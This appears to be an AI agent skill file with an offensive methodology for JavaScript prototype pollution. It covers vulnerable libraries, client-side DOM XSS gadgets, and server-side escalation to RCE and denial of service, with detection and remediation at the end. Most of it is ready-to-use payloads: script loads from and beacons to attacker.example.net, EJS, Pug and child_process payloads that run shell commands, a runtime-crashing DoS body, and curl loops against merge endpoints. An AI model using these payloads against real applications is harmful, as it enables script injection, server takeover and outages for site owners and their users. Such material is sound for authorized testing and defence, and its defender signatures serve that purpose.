---
name: offensive-prototype-pollution
description: "JavaScript prototype pollution testing skill for offensive security assessments and bug bounty hunting. Covers client-side and server-side (Node.js) pollution via __proto__, constructor.prototype, and constructor[prototype] sources delivered through query strings, JSON bodies, and vulnerable merge/clone/path libraries (lodash defaultsDeep/merge/set CVE-2019-10744, jQuery $.extend deep, minimist, set-value, deep-extend). Includes source/sink discovery with DOM Invader, ppmap, and ppfuzz; gadget-driven DOM XSS (sanitizer config, script/img src, document.write gadgets); server-side gadget chains to RCE via child_process spawn/execSync options, template engine options (EJS/Pug/Handlebars), Express query parser abuse, and DoS; the historic Kibana RCE; plus detection and remediation (Object.create(null), Map, Object.freeze, JSON schema validation, Node --disable-proto). Use when testing deep-merge or recursive-assign code paths, polluting Object.prototype, hunting client-side prototype pollution gadgets, or escalating pollution to XSS or RCE."
---

# Prototype Pollution — Offensive Testing Methodology

Prototype pollution is a JavaScript-specific injection class: by writing to `Object.prototype` (or any object's prototype) through attacker-controlled keys, you implant properties that every object in the runtime inherits. On its own a polluted prototype rarely does damage — it becomes critical when a downstream *gadget* reads an inherited property it never set and uses it in a dangerous sink. The surface spans both sides of the stack: client-side pollution feeds DOM XSS gadgets in common libraries, while server-side pollution in Node.js reaches `child_process`, template engines, and the Express request parser to produce RCE or denial of service. This skill treats pollution and gadget discovery as two distinct phases — you must land both to have an exploitable finding.

## Quick Workflow

1. Enumerate every input that reaches a recursive merge, clone, or path-setting operation (query strings, JSON bodies, form parameters, config loaders, WebSocket messages).
2. Pollute with the three canonical sources — `__proto__`, `constructor.prototype`, `constructor[prototype]` — and confirm the write survives by reading an inherited property back.
3. Classify the context: client-side (browser runtime) or server-side (Node.js process).
4. Hunt for a gadget — a code path that reads an undeclared property and sinks it into HTML, a command, a template option, or a protocol parser.
5. Chain pollution + gadget into impact (DOM XSS, RCE, DoS, auth/logic bypass), then document the exact source, gadget, and remediation.

---

## Core Concepts — Sources, Sinks, Gadgets

Three terms you will reuse constantly:

- **Source** — the attacker-controlled input and the key path that lets you write onto a prototype (e.g. `__proto__.foo`).
- **Pollution sink** — the vulnerable operation that follows the key path without blocking prototype keys (deep merge, recursive clone, `_.set`-style path assignment, query parsing).
- **Gadget** — unrelated code that *reads* a property it never defined, inheriting your polluted value, and passes it to a dangerous operation.

The three source syntaxes, because sinks filter them inconsistently:

```javascript
// Dunder proto — the classic
obj["__proto__"]["polluted"] = "yes";

// constructor.prototype — survives naive __proto__ blacklists
obj["constructor"]["prototype"]["polluted"] = "yes";

// bracketed constructor[prototype] — survives dot-path and some regex filters
obj["constructor"]["prototype"]["polluted"] = "yes"; // via path "constructor[prototype][polluted]"
```

After any pollution attempt, verify with a fresh empty object:

```javascript
({}).polluted; // => "yes" means Object.prototype is polluted globally
```

---

## Detection — Confirming a Polluted Prototype

### Client-Side Quick Probes

Paste these into the browser query string or hash, then check `Object.prototype` in DevTools:

```http
GET /?__proto__[testpp]=reflected HTTP/1.1
GET /?__proto__.testpp=reflected HTTP/1.1
GET /?constructor.prototype.testpp=reflected HTTP/1.1
GET /?constructor[prototype][testpp]=reflected HTTP/1.1
```

Confirmation in the console:

```javascript
// After loading the polluted URL:
Object.prototype.testpp;   // => "reflected"  (polluted)
({}).testpp;               // => "reflected"
"testpp" in {};            // => true
Object.keys({});           // => []  (inherited props are non-enumerable → stays empty)
```

The last check matters: polluted properties are inherited, so `Object.keys` and `hasOwnProperty` stay clean. That is exactly why gadgets miss them and why defenders overlook them.

### Server-Side Quick Probes

Send pollution through a JSON body into a merge/clone endpoint, then observe a behavioral change (status code, reflected default, timing, or an error that references an inherited property):

```http
POST /api/profile HTTP/1.1
Host: example.com
Content-Type: application/json

{"__proto__":{"testpp":"reflected"}}
```

```http
POST /api/profile HTTP/1.1
Host: example.com
Content-Type: application/json

{"constructor":{"prototype":{"testpp":"reflected"}}}
```

A safe, non-destructive server-side oracle is to pollute a property the app is likely to read as a boolean/flag and watch behavior flip. Prefer read-back oracles over anything that mutates shared state in production.

### Status-Code Oracle (Express)

A widely reliable server-side detection trick: pollute a property that the HTTP/JSON stack reads during response generation. If the server suddenly returns a changed status or a parse error only when the polluted key is present, you have landed a write.

```http
POST / HTTP/1.1
Content-Type: application/json

{"__proto__":{"status":510}}
```

If subsequent responses carry the injected status, the prototype write reached a gadget in the response path.

---

## Vulnerable Libraries — Pollution Sinks

These are the historically abusable merge/clone/path utilities. Fingerprint the version, then target the matching sink.

| Library | Sink API | Notable CVE | Pollution key |
|---|---|---|---|
| lodash | `_.defaultsDeep`, `_.merge`, `_.mergeWith`, `_.set`, `_.setWith` | CVE-2019-10744 (`defaultsDeep`), CVE-2018-16487 (`merge`) | `__proto__`, `constructor.prototype` |
| jQuery | `$.extend(true, ...)` (deep) | CVE-2019-11358 | `__proto__` |
| minimist | argv parsing `--__proto__.x` | CVE-2020-7598 | `__proto__` |
| set-value | `set(obj, path, val)` | CVE-2019-10747 | `constructor.prototype` |
| deep-extend | recursive extend | CVE-2018-3750 | `__proto__` |
| merge / deepmerge forks | recursive merge | multiple | `__proto__` |
| mixin-deep | `mixinDeep` | CVE-2019-10746 | `constructor.prototype` |

### lodash CVE-2019-10744 (`defaultsDeep`)

`defaultsDeep` recursively fills defaults and, in vulnerable versions, follows `constructor.prototype` even when `__proto__` is blocked:

```javascript
const _ = require("lodash"); // < 4.17.12
_.defaultsDeep({}, JSON.parse('{"constructor":{"prototype":{"polluted":"yes"}}}'));
console.log(({}).polluted); // "yes"
```

### lodash `_.merge` / `_.set`

```javascript
const _ = require("lodash"); // < 4.17.11 for merge
_.merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log(({}).isAdmin); // true

// Path-based sink — _.set with attacker-controlled path
_.set({}, "__proto__.polluted", "yes");
console.log(({}).polluted); // "yes"
```

### jQuery `$.extend` deep (CVE-2019-11358)

```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log(({}).polluted); // "yes"
```

### minimist (CVE-2020-7598)

Pollution through CLI argument parsing — relevant wherever user input becomes argv:

```bash
node app.js --__proto__.polluted yes
# minimist < 1.2.3 writes to Object.prototype
```

```javascript
const argv = require("minimist")(["--__proto__.polluted", "yes"]);
console.log(({}).polluted); // "yes"
```

---

## Client-Side — Discovery & Tooling

### DOM Invader (Burp Suite)

Burp's built-in browser ships **DOM Invader**, which automates both prototype pollution source discovery and gadget scanning:

1. Open Burp's embedded browser, enable DOM Invader in the extension toolbar.
2. Toggle **Prototype pollution** on. Browse the target normally.
3. DOM Invader injects canary pollution into query/hash/JSON sources and reports which land on `Object.prototype`.
4. For each confirmed source, click **Scan for gadgets** — it walks libraries on the page looking for property reads that reach a sink, and can auto-generate a PoC URL.

### ppmap

`ppmap` crawls a target and fingerprints both the source and a known-exploitable client-side library in one pass:

```bash
# Scan a single URL for client-side prototype pollution + known gadgets
ppmap -u "https://example.com/?x=1"

# Feed a list of URLs
cat urls.txt | ppmap
```

`ppmap` carries a database of library gadgets (sanitizer configs, ad/analytics loaders) and will tell you which script turns your pollution into XSS.

### ppfuzz

`ppfuzz` is a fast Rust fuzzer for client-side prototype pollution sources across many URLs:

```bash
# Fuzz a list of URLs for __proto__ / constructor sources
ppfuzz -l urls.txt

# Single target with increased concurrency
ppfuzz -u "https://example.com/?search=test" -c 100
```

### Manual Source Discovery

Review client JavaScript for recursive merges fed by URL-derived data:

```javascript
// Typical vulnerable pattern — query string parsed into an object, then merged
function parseQuery(qs) {
  const obj = {};
  qs.split("&").forEach((pair) => {
    const [k, v] = pair.split("=");
    deepSet(obj, decodeURIComponent(k).split("."), decodeURIComponent(v)); // follows __proto__
  });
  return obj;
}

// Grep targets in bundled JS
// location.hash / location.search → JSON.parse → $.extend(true | _.merge | custom deepMerge
```

---

## Client-Side — Pollution to DOM XSS Gadgets

Pollution alone is inert in the browser; you need a gadget that reads an inherited property and writes it into a script-executing sink. These are the durable gadget families.

### Sanitizer / Config Gadgets

Libraries that read options from an object with `obj.option ?? default` inherit polluted options. A common one: a sanitizer or template config that checks an allow-flag.

```javascript
// Gadget: library reads config.sanitize, which you never set
// Pollute so sanitize === false, then inject HTML through a normal input
// URL:
//   https://example.com/?__proto__[sanitize]=false
// or
//   https://example.com/?__proto__.sanitize=false
```

### script src / img src Gadgets

Loaders that build a `<script>` or `<img>` and read an inherited URL property:

```javascript
// Gadget seen in ad/analytics loaders:
const s = document.createElement("script");
s.src = config.src || defaultSrc; // config.src inherited from prototype
document.head.appendChild(s);
```

```http
GET /?__proto__[src]=https://attacker.example.net/evil.js HTTP/1.1
```

For an `img` error-handler gadget:

```http
GET /?__proto__[src]=x&__proto__[onerror]=alert(document.domain) HTTP/1.1
```

### document.write Gadgets

Some libraries emit markup via `document.write(prefix + config.X + suffix)` where `config.X` is inherited:

```javascript
// Gadget:
document.write("<img src='" + (opts.logo || "/logo.png") + "'>");
// Pollute opts.logo to break out of the attribute:
//   __proto__[logo]=x'><script>alert(document.domain)</script>
```

```http
GET /?__proto__[logo]=x%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
```

### Known Client-Side Gadget Chains

PortSwigger's research and the DOM Invader gadget database document real chains in widely deployed scripts. The methodology is constant: pollute an option that a loader/sanitizer reads, then supply ordinary content that the now-weakened code renders as script. Always confirm execution with an observable side-effect (a network beacon to `192.0.2.10`, a `console.log`, or a DOM mutation) rather than relying solely on `alert`, which browsers throttle in background or cross-origin frames.

```javascript
// Reliable detection beacon instead of alert()
new Image().src = "https://attacker.example.net/beacon?d=" + encodeURIComponent(document.domain);
```

---

## Server-Side (Node.js) — Pollution to RCE

Server-side pollution is higher impact: `Object.prototype` is process-global, so a single polluted key influences every request handler, template render, and child process spawn until the process restarts. Land the pollution through a JSON body or query parser, then reach one of these gadgets.

### child_process Gadgets (spawn / execSync options)

`child_process` functions read options like `shell`, `env`, and `NODE_OPTIONS` from an options object. If the app spawns a process with an options object that inherits polluted properties, you control execution.

```javascript
// Gadget: app spawns a child with a sparse options object
const { execSync } = require("child_process");
execSync("ls", {}); // {} inherits Object.prototype
```

Polluting `shell` and argument-injecting via `NODE_OPTIONS` is the canonical escalation. The widely documented chain pollutes `NODE_OPTIONS` to force Node to import an attacker-controlled file, combined with `shell`/`env`:

```http
POST /api/merge HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /proc/self/environ",
    "env": { "EVIL": "console.log(require('child_process').execSync('id').toString())//" }
  }
}
```

When a later `child_process` call runs with an options object that inherits these, Node re-executes with the injected `--require`, yielding code execution. Exact gadget availability depends on Node version and how the app invokes `child_process`; verify in a lab mirror of the target before using it live.

### spawn argv0 / stdio Gadgets

```javascript
// Gadget: spawn without an explicit argv0/options, inheriting prototype
const { spawn } = require("child_process");
spawn("node", ["-v"], {}); // options inherits; argv0/shell/env all pollutable
```

### Template Engine Option Gadgets

Server-side template engines read compilation/render options from objects. Polluting those options reaches a code-generating sink.

#### EJS

EJS builds a JavaScript function from its template using options. Polluting the internal `outputFunctionName` (or similar compile option) injects code into the generated function:

```http
POST /render HTTP/1.1
Content-Type: application/json

{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
```

#### Pug

Pug compiles templates to functions and reads options like `self` / `compileDebug` / block handling. A polluted `block` or compile option can inject into the compiled function body:

```http
POST /render HTTP/1.1
Content-Type: application/json

{"__proto__":{"block":{"type":"Text","val":"process.mainModule.require('child_process').execSync('id')"}}}
```

#### Handlebars

Handlebars reads compile/runtime options; polluting a helper-resolution or compile flag can redirect lookups toward attacker-controlled behavior. Treat the engine's options object as a gadget surface and enumerate each option it reads that you can pollute.

> ⚠ Template-engine gadgets are version-sensitive. Fingerprint the exact engine version and confirm the specific option name in a lab build; option names have changed across releases.

### Express Query Parser Gadget

Express uses `qs` (extended query parser) by default, which parses bracket notation into nested objects — directly reaching `__proto__` in older configurations. A single GET can pollute the process:

```http
GET /?__proto__[polluted]=yes HTTP/1.1
Host: example.com
```

Downstream, any middleware that reads an inherited option (body-size limits, view options, JSON spacing) becomes a gadget. The classic `{"__proto__":{"status":510}}` and content-type gadgets flow from the same parser.

### Historic Kibana RCE

Kibana's Timelion feature was vulnerable to a server-side prototype pollution chain that escalated to RCE (tracked publicly as the Kibana prototype-pollution RCE, CVE-2019-7609). The attacker polluted a property read by a `child_process.fork` call path, forcing Kibana's Node process to execute an attacker-supplied script via a canvas/Timelion gadget. It remains the reference case study for "SSPP → child_process → RCE" and demonstrates why any server-side pollution finding in a Node app should be escalated through the process-spawning paths, not reported as informational.

### Server-Side Denial of Service

Even without a code-exec gadget, pollution can degrade or crash a service:

```http
POST /api/merge HTTP/1.1
Content-Type: application/json

{"__proto__":{"toString":{}}}
```

Polluting `toString`, `valueOf`, `then`, or other methods every object relies on can break the entire runtime — any coercion to string, any promise resolution, or any JSON serialization throws, producing a global DoS until restart. Treat this as destructive; only demonstrate it against authorized, non-production targets.

---

## Automation Workflow

```bash
# 1. Collect URLs with parameters
cat domains.txt | httpx -silent | tee alive.txt
cat alive.txt | gau | grep "=" | tee params.txt

# 2. Fuzz client-side sources at scale
ppfuzz -l params.txt -c 100 | tee ppfuzz.out

# 3. Deep single-target scan with gadget fingerprinting
ppmap -u "https://example.com/?x=1"

# 4. Burp embedded browser → DOM Invader → Prototype pollution toggle → Scan for gadgets

# 5. Server-side: replay JSON merge endpoints with pollution payloads
for src in '{"__proto__":{"ppcheck":"1"}}' \
           '{"constructor":{"prototype":{"ppcheck":"1"}}}'; do
  curl -s -X POST https://example.com/api/merge \
    -H 'Content-Type: application/json' -d "$src" -o /dev/null -w "%{http_code}\n"
done
```

---

## Detection / Defender View

What defenders observe, and how pollution hides:

- **Invisible to enumeration.** Polluted properties are inherited and non-enumerable, so they never appear in `Object.keys`, `JSON.stringify`, or most logging of request-derived objects. Signature detection must look at the raw *input* (`__proto__`, `constructor`, `prototype` keys), not the resulting object.
- **WAF/log signatures.** Flag request bodies and query strings containing `__proto__`, `constructor`, and `prototype` in key positions, including URL-encoded (`%5f%5fproto%5f%5f`), bracketed (`constructor[prototype]`), and dotted (`constructor.prototype`) forms.
- **Runtime canaries.** Defenders can set a sentinel like `Object.defineProperty(Object.prototype, "__pp_canary__", { get() { throw new Error("pollution"); } })` in non-prod to catch writes.
- **Behavioral anomalies.** Sudden global failures (every request 500s after one POST), unexpected template output, or child processes spawning with altered options are tell-tale signs of a landed server-side pollution.

### Example WAF/SIEM Signature (concept)

```
request.body OR request.query matches (?i)(__proto__|constructor\s*[\.\[]\s*prototype|%5f%5fproto%5f%5f)
```

---

## Remediation (what to recommend in the report)

```javascript
// 1. Null-prototype objects — no Object.prototype to pollute
const safe = Object.create(null);
safe[userKey] = userVal; // writing "__proto__" sets an own property, pollutes nothing

// 2. Use Map for arbitrary user keys instead of plain objects
const m = new Map();
m.set(userKey, userVal);

// 3. Freeze the prototype so writes throw (or silently fail in sloppy mode)
Object.freeze(Object.prototype);

// 4. Reject dangerous keys before merge/set
const BLOCK = new Set(["__proto__", "constructor", "prototype"]);
function safeKey(k) { if (BLOCK.has(k)) throw new Error("illegal key"); return k; }

// 5. Validate input against a strict JSON schema (ajv) that disallows extra keys
//    additionalProperties: false + no __proto__ in properties
```

- Upgrade vulnerable libraries: lodash ≥ 4.17.12, jQuery ≥ 3.4.0, minimist ≥ 1.2.3, set-value ≥ 3.0.1.
- Run Node with `--disable-proto=throw` (or `delete`) to neutralize the `__proto__` accessor globally.
- Prefer sanitizer/template libraries that take explicit own-property config and read options with `Object.hasOwn` rather than inherited lookups.

---

## Engagement Cheatsheet

```http
# --- Detect (client) ---
GET /?__proto__[testpp]=reflected
GET /?__proto__.testpp=reflected
GET /?constructor.prototype.testpp=reflected
GET /?constructor[prototype][testpp]=reflected
# DevTools: ({}).testpp === "reflected"  → polluted

# --- Detect (server, JSON merge) ---
POST /api/merge  {"__proto__":{"ppcheck":"1"}}
POST /api/merge  {"constructor":{"prototype":{"ppcheck":"1"}}}
POST /           {"__proto__":{"status":510}}   # Express status-code oracle

# --- Client XSS gadgets ---
GET /?__proto__[sanitize]=false                 # weaken sanitizer, then inject HTML
GET /?__proto__[src]=https://attacker.example.net/evil.js   # script-src loader gadget
GET /?__proto__[src]=x&__proto__[onerror]=<beacon>          # img onerror gadget

# --- Server RCE gadgets (verify engine/version in lab first) ---
POST /render  {"__proto__":{"outputFunctionName":"x;<code>;x"}}        # EJS
POST /render  {"__proto__":{"block":{"type":"Text","val":"<code>"}}}   # Pug
POST /api/merge {"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ", ...}}  # child_process

# --- DoS (authorized/non-prod only) ---
POST /api/merge  {"__proto__":{"toString":{}}}

# --- Confirm globally ---
# ({}).<key>  /  "<key>" in {}  /  Object.prototype.<key>
```

Tool sequence: `ppfuzz -l params.txt` → `ppmap -u <hit>` → Burp DOM Invader gadget scan (client); JSON merge replay + child_process/template gadget probing (server).

---

## Key References

- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') — https://cwe.mitre.org/data/definitions/1321.html
- Olivier Arteau, "Prototype pollution attacks in NodeJS applications" (NorthSec 2018) — original research defining the class — https://github.com/HoLyVieR/prototype-pollution-nsec18
- PortSwigger Web Security Academy — Prototype pollution labs and research (client-side sources/sinks, DOM Invader, server-side) — https://portswigger.net/web-security/prototype-pollution
- PortSwigger Research, "Widespread prototype pollution gadgets" — https://portswigger.net/research/widespread-prototype-pollution-gadgets
- CVE-2019-10744 — lodash `defaultsDeep` prototype pollution — https://nvd.nist.gov/vuln/detail/CVE-2019-10744
- CVE-2019-11358 — jQuery `$.extend` deep prototype pollution — https://nvd.nist.gov/vuln/detail/CVE-2019-11358
- CVE-2020-7598 — minimist prototype pollution — https://nvd.nist.gov/vuln/detail/CVE-2020-7598
- CVE-2019-10747 — set-value prototype pollution — https://nvd.nist.gov/vuln/detail/CVE-2019-10747
- CVE-2018-3750 — deep-extend prototype pollution — https://nvd.nist.gov/vuln/detail/CVE-2018-3750
- CVE-2019-10746 — mixin-deep prototype pollution — https://nvd.nist.gov/vuln/detail/CVE-2019-10746
- CVE-2019-7609 — Kibana Timelion prototype-pollution RCE — https://nvd.nist.gov/vuln/detail/CVE-2019-7609
- Snyk Vulnerability DB — prototype pollution advisories (lodash, minimist, set-value, deep-extend, jQuery) — https://security.snyk.io/vuln/npm
- Node.js CLI docs — `--disable-proto` flag — https://nodejs.org/api/cli.html#--disable-protomode
- Tools: ppmap (https://github.com/kleiton0x00/ppmap), ppfuzz (https://github.com/dwisiswant0/ppfuzz), Burp DOM Invader (https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
